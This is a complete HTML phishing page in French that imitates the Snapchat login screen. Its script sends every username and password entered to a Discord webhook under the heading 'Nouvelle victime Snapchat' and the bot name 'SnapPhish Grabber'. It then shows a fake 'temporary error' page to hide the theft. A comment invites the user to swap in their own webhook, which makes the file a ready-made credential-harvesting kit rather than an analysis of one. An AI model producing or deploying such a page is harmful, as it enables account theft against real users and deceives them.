<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #fffc00, #ff00c8);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            font-weight: bold;
            color: black;
        }
        h1 {
            font-size: 28px;
            margin: 10px 0 30px;
        }
        input {
            width: 100%;
            padding: 16px;
            margin: 12px 0;
            background: #1c1c1e;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #888;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #fffc00;
            color: black;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        .error-page {
            display: none;
            text-align: center;
        }
        .error-page h2 {
            color: #fffc00;
            font-size: 24px;
        }
        .error-page p {
            color: #aaa;
            margin: 20px 0;
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="container" id="loginContainer">
        <div class="logo">👻</div>
        <h1>Connexion à Snapchat</h1>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Nom d'utilisateur, email ou numéro" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        
        <p style="margin-top: 30px; color: #aaa;">
            <a href="#" style="color: #fffc00; text-decoration: none;">Mot de passe oublié ?</a>
        </p>
        
        <div class="footer">
            Pas de compte ? <a href="#" style="color: #fffc00;">Inscrivez-vous</a>
        </div>
    </div>

    <!-- Page d'erreur -->
    <div class="container error-page" id="errorPage">
        <div class="logo">👻</div>
        <h2>Impossible de se connecter</h2>
        <p>Une erreur temporaire s'est produite. Veuillez réessayer plus tard.</p>
        <button onclick="retryLogin()">Réessayer</button>
        <p style="margin-top: 40px; color: #aaa; font-size: 14px;">
            Si le problème persiste, contactez le support Snapchat.
        </p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1523844098707030156/DTAcgSkU7AcUq_q747nL4sPQ6lH_59jbOlPa7h2mxGabAb39wYnWJ2-XGumCkBOclj1D"; // Remplace par ton webhook

        function showErrorPage() {
            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('errorPage').style.display = 'block';
        }

        function retryLogin() {
            document.getElementById('loginContainer').style.display = 'block';
            document.getElementById('errorPage').style.display = 'none';
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const data = {
                content: `**Nouvelle victime Snapchat**\n**Username/Email:** ${username}\n**Mot de passe:** ${password}\n**Heure:** ${new Date().toLocaleString('fr-FR')}`,
                username: "SnapPhish Grabber"
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                showErrorPage();
            }).catch(() => {
                showErrorPage();
            });
        });
    </script>
</body>
</html>
